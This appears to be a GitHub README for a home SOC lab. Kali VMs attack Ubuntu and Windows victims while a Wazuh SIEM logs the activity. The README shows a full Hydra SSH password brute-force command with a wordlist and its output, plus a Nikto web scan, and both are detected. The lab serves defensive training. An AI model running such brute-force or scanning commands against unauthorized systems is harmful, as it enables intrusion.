# soc-lab-wazuh
A home lab setup using VMs to simulate using a SIEM (in this case wazuh).

```
VM                Host-only IP
Wazuh server	    192.168.56.10
Ubuntu victim	    192.168.56.11
Windows victim	    192.168.56.12
Kali	            192.168.56.13
```

Wazuh Server (Ubunutu 24.04) Running Aggregation:
<img width="1101" height="1024" alt="image" src="https://github.com/user-attachments/assets/833efc5a-505e-4cb6-b0c8-587221e82ad0" />

Windows 11 Host Device (Victim):
<img width="1097" height="1073" alt="image" src="https://github.com/user-attachments/assets/8e84af00-8764-422e-b9d3-6985d2c96988" />

Ubuntu 26.04 Server (Victim):
<img width="1101" height="1030" alt="image" src="https://github.com/user-attachments/assets/612ab718-555d-4fbe-a5bc-76eab15ba07e" />

Kali 2026 (Attacker):
<img width="1091" height="1053" alt="image" src="https://github.com/user-attachments/assets/66c23bc1-e5cc-4266-b6c1-2da6908a7aed" />

Wazuh Dashboard Before Attacks:
<img width="2550" height="783" alt="image" src="https://github.com/user-attachments/assets/d30e0b6e-caf1-4e02-8e90-b3655bf2b388" />

A user with a weak password was created (usr: labuser, pw: sunshine1)
A small txt file with common passwords was used:
```
password
123456
letmein
qwerty
sunshine1
admin
welcome1
```
┌──(user㉿kali)-[~]
└─$ hydra -l labuser -P pw.txt ssh://192.168.56.11 -t 4 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-08 14:10:07
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.56.11:22/
[22][ssh] host: 192.168.56.11   login: labuser   password: sunshine1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-08 14:10:14
      
After ssh brute force on Ubuntu Victim:
<img width="1919" height="954" alt="image" src="https://github.com/user-attachments/assets/f7b0dc7e-8523-4d02-9dda-ebf1068ed408" />

┌──(user㉿kali)-[~]
└─$ nikto -h http://192.168.56.11
- Nikto v2.6.1
---------------------------------------------------------------------------
+ Target IP:          192.168.56.11
+ Target Hostname:    192.168.56.11
+ Target Port:        80
+ Platform:           Linux/Unix
+ Start Time:         2026-11-08 14:16:07 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.66 (Ubuntu)
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [999990] OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ [600050] Apache/2.4.66 appears to be outdated (current is at least 2.4.68).
+ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ [007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options
+ [007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 8107 requests: 0 errors and 9 items reported on the remote host
+ End Time:           2026-11-08 14:16:23 (GMT-5) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

After web scanning attack:
<img width="1920" height="953" alt="image" src="https://github.com/user-attachments/assets/45f90711-6235-4187-9bba-b041d2122b9e" />


